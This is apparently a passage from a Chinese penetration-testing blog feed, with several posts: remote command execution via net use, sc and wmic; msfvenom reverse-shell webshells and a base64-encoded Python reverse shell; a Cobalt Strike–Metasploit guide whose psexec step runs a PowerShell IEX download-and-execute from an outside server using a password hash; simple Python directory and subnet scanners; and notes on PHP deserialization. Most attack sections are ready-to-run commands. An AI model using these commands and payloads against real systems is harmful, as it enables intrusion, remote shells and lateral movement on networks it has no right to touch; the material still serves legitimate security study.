<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$ <span class="string">"admin123"</span> /user:pt007</span><br><span class="line">net use</span><br><span class="line">dir \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$</span><br><span class="line">copy test.exe \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$</span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> create test binpath= <span class="string">"c:\test.exe"</span></span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> start test</span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> del test</span><br></pre></td></tr></table></figure>

<ul>
<li>利用wmic远程命令执行</li>
</ul>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.1</span>.<span class="number">158</span> /user:pt007 /password:admin123  process call create <span class="string">"cmd.exe /c ipconfig&gt;d:\result.txt"</span></span><br></pre></td></tr></table></figure>

<h4 id="生成webshell脚本"><a href="#生成webshell脚本" class="headerlink" title="生成webshell脚本"></a><strong>生成webshell脚本</strong></h4><p>​    在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，这里介绍下如何使用msfvenom生成webshell。</p>
<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f<span class="built_in"> raw </span>&gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">'&lt;?php '</span> | tr -d <span class="string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<h4 id="如何利用-1"><a href="#如何利用-1" class="headerlink" title="如何利用"></a>如何利用</h4><p>下面以php为例做一下测试，使用以下命令生成一个webshell：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.88</span><span class="number">.128</span> LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt></p>
<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">    </span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp </span><br><span class="line">    </span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span></span><br><span class="line">    </span><br><span class="line">set LPORT  <span class="number">4444</span> </span><br><span class="line">    </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt></p>
<h4 id="脚本shell"><a href="#脚本shell" class="headerlink" title="脚本shell"></a>脚本shell</h4><p>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p>
<p>这种反弹方式也叫做<strong>git解释性脚本语言反弹shell</strong></p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h5><p>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=<span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> LPORT=<span class="number">4444</span> -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">    </span><br><span class="line">set PAYLOAD cmd/unix/reverse_python </span><br><span class="line">    </span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> set LPORT  <span class="number">4444</span> </span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>然后复制shell.py中的内容在linux命令行下执行，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt></p>
<p>结果如图：</p>
<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt></p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a></p>
<p><a href="https://blog.51cto.com/13539934/2113551" target="_blank" rel="noopener">https://blog.51cto.com/13539934/2113551</a></p>
<p>[<a href="https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]" target="_blank" rel="noopener">https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]</a>(</p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>msf与cs联动</title>
    <url>/2020/06/05/msf-yu-cs-lian-dong/</url>
    <content><![CDATA[<p><strong>转载自:</strong><a href="https://www.secshi.com/21526.html" target="_blank" rel="noopener">https://www.secshi.com/21526.html</a></p>
<p><strong>前言</strong></p>
<p>CobalStrike 与 Metasploit 均是渗透利器，各有所长。前者更适合做稳控平台，后者则更擅长内网各类探测搜集与漏洞利用。两者更需要灵活的联动，各自相互依托，从而提升渗透的效率。</p>
<p><strong>内置Socks功能</strong></p>
<p>通过Beacon内置的socks功能在VPS上开启代理端口，打通目标内网通道，之后将本地Metasploit直接带入目标内网，进行横向渗透。</p>
<p>当然，也可以把代理设置在其他的工具上，不限于Proxychains、Proxifier等。</p>
<p>首先，到已控目标机的Beacon下将socks代理开启。</p>
<p>1 | beacon &gt; socks 1024 #端口根据VPS实际情况进行设置</p>
<p><img src="http://img.payloads.cn/blog/2019-12-10-165921.png" alt="img"></p>
<p>点开菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中。</p>
<p><img src="http://img.payloads.cn/blog/2019-12-10-165926.png" alt="img"></p>
<p>本地启动Metasploit，挂上代理，就可以对目标内网进行各种探测搜集。如 探测目标内网中存在MS17_010漏洞的主机，这也是内网拿主机权限利用方式之一。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">setg</span> <span class="string">Proxies</span> <span class="string">socks4/5:ip:port</span> <span class="comment">#让msf所有模块的流量都通过此代理走。(setg全局设置)</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">setg</span> <span class="string">ReverseAllowProxy</span> <span class="literal">true</span> <span class="comment">#允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">use</span> <span class="string">auxiliary/scanner/smb/smb_ms17_010</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">rhosts</span> <span class="number">192.168</span><span class="number">.144</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">threads</span> <span class="number">100</span> <span class="comment">#内网渗透时线程不要太高！</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">run</span></span><br></pre></td></tr></table></figure>



<p><img src="http://img.payloads.cn/blog/2019-12-04-101356.jpg" alt="img"></p>
<p><strong>利用MSF模块上线Beacon shell</strong></p>
<p>当通过其它方式拿到了目标内网中某台Windows机器的本地管理员明文密码或hash时，可利用Metasploit下auxiliary/admin/smb/psexec_command模块，直接上线指定目标机器的Beacon shell。<strong>(前提目标机可出网)</strong></p>
<p>先利用CobalStrike生成上线Beacon的powershell。</p>
<p><img src="http://img.payloads.cn/blog/2019-12-10-165938.png" alt="img"></p>
<p>本地启动Metasploit，挂上代理，设置psexec_command模块参数。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf5 &gt; setg Proxies socks4/5:ip:port</span><br><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> rhosts 192.168.144.0/24</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> threads 10</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> smbuser administrator</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 #明文、密文均可</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> command powershell.exe -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://149.28.xx.xx:80/a'))"</span> #上线CS的powershell，目标机存在杀软需考虑</span><br><span class="line">msf5 &gt; run</span><br></pre></td></tr></table></figure>



<p><img src="http://img.payloads.cn/blog/2019-12-10-165946.png" alt="img"></p>
<p>最终，只要密码一致、 能出网，且未被杀软阻止的均会成功上线。</p>
<h4 id="CS与MSF会话互传"><a href="#CS与MSF会话互传" class="headerlink" title="CS与MSF会话互传"></a>CS与MSF会话互传</h4><h5 id="CobaltStrike派生Metasploit"><a href="#CobaltStrike派生Metasploit" class="headerlink" title="CobaltStrike派生Metasploit"></a>CobaltStrike派生Metasploit</h5><p>​    当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp #不要用x64的payload</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lhost 10.11.42.99</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lport 5353</span><br><span class="line">msf5 &gt; <span class="builtin-name">run</span> -j</span><br></pre></td></tr></table></figure>

<p><img src="http://img.payloads.cn/blog/2019-12-04-101361.jpg" alt="img"></p>
<p>之后使用CobaltStrike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口。</p>
<p><img src="http://img.payloads.cn/blog/2019-12-04-101405.jpg" alt="img"></p>
<p>然后选中计算机，右键-&gt;Spawn：选择MSF的监听器：</p>
<p><img src="http://img.payloads.cn/blog/2019-12-04-101362.jpg" alt="img"></p>
<p>这个时候可以看到，Metasploit上的监听已经上线，现在可以对meterpreter获得的session进行控制。</p>
<p><img src="http://img.payloads.cn/blog/2019-12-04-101340.jpg" alt="img"></p>
<h5 id="Metasploit派生CobaltStrike"><a href="#Metasploit派生CobaltStrike" class="headerlink" title="Metasploit派生CobaltStrike"></a>Metasploit派生CobaltStrike</h5><p>现在已经获得了一个meterpreter的session，把session传给CobaltStrike。</p>
<p><img src="http://img.payloads.cn/blog/2019-12-04-101408.jpg" alt="img"></p>
<p>在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike客户端IP，创建好之后便监听8099端口，等待着被控机连接。</p>
<p><img src="http://img.payloads.cn/blog/2019-12-04-101359.jpg" alt="img"></p>
<p>接下来，把meterpreter获得的session转交给CobaltStrike，在Metasploit执行以下命令：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">msf5 &gt; use exploit/windows/local/payload_inject </span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lhost 192.168.144.174</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lport 8099</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> DisablePayloadHandler <span class="literal">true</span>  </span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> session 1</span><br><span class="line">msf5 &gt; run</span><br></pre></td></tr></table></figure>

<p>解释一下这些参数。由于CobaltStrike的监听器我们使用的是：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">windows<span class="regexp">/beacon_http/</span>reverse_http</span><br></pre></td></tr></table></figure>

<p>所以我们的payload也要使用：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">payload windows<span class="regexp">/meterpreter/</span>reverse_http</span><br></pre></td></tr></table></figure>

<p>设置本地监听IP和端口：由于监听器是CobaltStrike的，所以要<strong>设置成CobaltStrike机器的IP与端口。</strong></p>
<p>默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，这里我们设置：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">set</span> DisablePayloadHandler <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>设置当前的session，执行run。</p>
<p><img src="http://img.payloads.cn/blog/2019-12-04-101342.jpg" alt="img"></p>
<p>此时目标机便已成功从CobaltStrike上线。</p>
<p><img src="http://img.payloads.cn/blog/2019-12-04-101341.jpg" alt="img"></p>
<p><strong>总结</strong></p>
<p>关于CobalStrike与Metasploit 的联动利用方式远不止这些，每种方式在实战中都有对应的应用场景，更需要探索与总结。</p>
]]></content>
      <categories>
        <category>内网与域渗透学习</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>python编写简单C段&amp;web目录扫描工具</title>
    <url>/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/</url>
    <content><![CDATA[<h2 id="Python编写C段-amp-web目录扫描工具"><a href="#Python编写C段-amp-web目录扫描工具" class="headerlink" title="Python编写C段&amp;web目录扫描工具"></a>Python编写C段&amp;web目录扫描工具</h2><h4 id="python编写目录扫描工具"><a href="#python编写目录扫描工具" class="headerlink" title="python编写目录扫描工具"></a>python编写目录扫描工具</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> optparse import OptionParser</span><br><span class="line">import threading</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> Queue </span>import Queue</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class WEB_DIR(threading.Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self._queue = queue</span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            url = self._queue.<span class="builtin-name">get</span>()</span><br><span class="line">            try:</span><br><span class="line">                headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr'</span>&#125;</span><br><span class="line">                r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">timeout</span>=1)</span><br><span class="line">            except Exception,e:</span><br><span class="line">              pass</span><br><span class="line">            <span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">                <span class="builtin-name">print</span> <span class="string">'[*]'</span> + url</span><br><span class="line"></span><br><span class="line">def start(url,file,count):</span><br><span class="line">   <span class="built_in"> queue </span>= Queue()</span><br><span class="line">    f = open(<span class="string">'%s.txt'</span> % file, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        queue.put(url + i.strip(<span class="string">'\r\n'</span>))</span><br><span class="line">    threads = []</span><br><span class="line">    thread_count = int(count)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_count):</span><br><span class="line">        threads.append(WEB_DIR(queue))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"-u"</span>,<span class="string">"--url"</span>,<span class="attribute">dest</span>=<span class="string">"url"</span>,help="Target url <span class="keyword">for</span> scan<span class="string">")</span></span><br><span class="line"><span class="string">    parser.add_option("</span>-f<span class="string">", "</span>--file<span class="string">", dest="</span>filename<span class="string">", help="</span>Dir filename<span class="string">")</span></span><br><span class="line"><span class="string">    parser.add_option("</span>-t<span class="string">", "</span>--thread<span class="string">", dest="</span>count<span class="string">",type=int,default=10, help="</span>scan thread count<span class="string">")</span></span><br><span class="line"><span class="string">    options,args = parser.parse_args()</span></span><br><span class="line"><span class="string">    if options.url and options.filename:</span></span><br><span class="line"><span class="string">        start(options.url,options.filename,options.count)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        parser.print_help()</span></span><br><span class="line"><span class="string">        sys.exit(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == '__main__':</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure>

<h4 id="python编写C段扫描工具"><a href="#python编写C段扫描工具" class="headerlink" title="python编写C段扫描工具"></a>python编写C段扫描工具</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import ipaddr</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> Queue </span>import Queue</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class C_Scan(threading.Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self._queue = queue</span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            r = 0</span><br><span class="line">            url = str(self._queue.<span class="builtin-name">get</span>())</span><br><span class="line">            url = <span class="string">'http://'</span>+url</span><br><span class="line">            try:</span><br><span class="line">                headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr'</span>&#125;</span><br><span class="line">                r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">timeout</span>=1)</span><br><span class="line">            except Exception,e:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">                    <span class="builtin-name">print</span> <span class="string">'[*]'</span> + url</span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">'Usage: Python %s 192.168.1.1/24'</span>%(sys.argv[0])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        threads = []</span><br><span class="line">        threadnum = 250</span><br><span class="line">       <span class="built_in"> queue </span>= Queue()</span><br><span class="line">        cidrip = sys.argv[1]</span><br><span class="line">        ips = ipaddr.IPNetwork(cidrip)</span><br><span class="line">        <span class="keyword">for</span><span class="built_in"> ip </span><span class="keyword">in</span> ips:</span><br><span class="line">            queue.put(ip)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(threadnum):</span><br><span class="line">            threads.append(C_Scan(queue))</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"All Finished!!!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python编程学习</category>
      </categories>
  </entry>
  <entry>
    <title>php反序列化漏洞学习</title>
    <url>/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/</url>
    <content><![CDATA[<h2 id="反序列化漏洞学习笔记-靶场实战"><a href="#反序列化漏洞学习笔记-靶场实战" class="headerlink" title="反序列化漏洞学习笔记+靶场实战"></a>反序列化漏洞学习笔记+靶场实战</h2><h4 id="反序列化漏洞相关知识点："><a href="#反序列化漏洞相关知识点：" class="headerlink" title="反序列化漏洞相关知识点："></a>反序列化漏洞相关知识点：</h4><p><strong>（引自 i春秋网络安全学院文章）</strong></p>
<p>什么是反序列化：</p>
<p>摘自维基百科：序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p>
<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>
<p>序列化根据编程语言的不同分为：<strong>php反序列化，Java反序列化，python反序列化。</strong></p>
<p>在php应用中，序列化和反序列化一般用做缓存，比如<strong>seesion缓存,cookie</strong>等。</p>
<ul>
<li>序列化与反序列化与两个函数有关，分别是 <code>serialize()</code>、 <code>unserialize()</code> 这两个函数。</li>
<li>一般常用于传递 object ,object对象没法直接传值，所以需要先序列化为一段 字符串，接收方接收到后进行反序列化操作后即可得到原object对象。</li>
<li>当序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数 <em>\</em>sleep() ，这就允许对象在被序列化之前 做任何清除操作。类似的，当使用 unserialize() 恢复对象之前，将调用 __wakeup() 成员函数</li>
<li>反序列化函数<code>unserialize()</code>接收一个string类型的变量，该值为已序列化后的字符串。</li>
<li>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP会自动地试图去调用 <code>__wakeup()</code> 成员函数 （如果存在的话）。</li>
</ul>
<p><strong>常见的序列化格式：</strong></p>
<ul>
<li><p>二进制</p>
</li>
<li><p>字节数组</p>
</li>
<li><p>json字符串</p>
</li>
<li><p>xml字符串</p>
<p><strong>序列化的字符串参数理解：</strong></p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/1344396-20181107131554874-1824306350.png" style="zoom:50%;">

<p><strong>PHP序列化与反序列化</strong></p>
<p>实现函数:<strong>string serialize()</strong>和 <strong>mixed  unserialize()</strong></p>
<p>我们这里创建了一个对象，并通过serialize序列化后进行了打印；</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114102224.png" style="zoom:67%;">

<h5 id="魔术函数（Magic-fucntion"><a href="#魔术函数（Magic-fucntion" class="headerlink" title="魔术函数（Magic fucntion)"></a>魔术函数（Magic fucntion)</h5><p>PHP类中有一种特殊函数体的存在叫<strong>魔法函数</strong>，magic函数命名是以符号__开头的。</p>
<p>导致php出现反序列化漏洞的<strong>主要原因</strong>就是我们所调用的<strong>魔术函数</strong>：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">__wakeup</span>() <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="selector-tag">__sleep</span>() <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="selector-tag">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="selector-tag">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="selector-tag">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="selector-tag">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="selector-tag">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="selector-tag">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="selector-tag">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="selector-tag">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="selector-tag">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>

<p>利用代码测试魔术环境：</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114005210.png" style="zoom:50%;">

</li>
</ul>
<p>运行发现php文件发现</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200114090134.png" style="zoom:67%;">

<p><strong><strong>_wakeup()会在unserialize()自动调用，     _</strong>destruct会在对象销毁时自动调用</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-d1181fb9a5ec18b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h4 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h4><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>PHP反序列化漏洞又称PHP对象注入，可能导致远程代码执行(RCE)，主要原因是程序的输入不当导致。</p>
<h5 id="漏洞产生的必要条件："><a href="#漏洞产生的必要条件：" class="headerlink" title="漏洞产生的必要条件："></a>漏洞产生的必要条件：</h5><p>1.unserialize函数的变量可控。（还可以结合Phar://协议）</p>
<p>2.php文件中存在可利用的类，类中有魔术方法。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h5><p>我们在本地网站新建demo.php</p>
<img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ截图20200113235252.png" style="zoom:50%;">

<p>我们可以尝试构造一个对象，控制$test的值，达到控制数据流的目的，实现反序列化漏洞的利用</p>
<p><img src="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200113235324.png" alt></p>
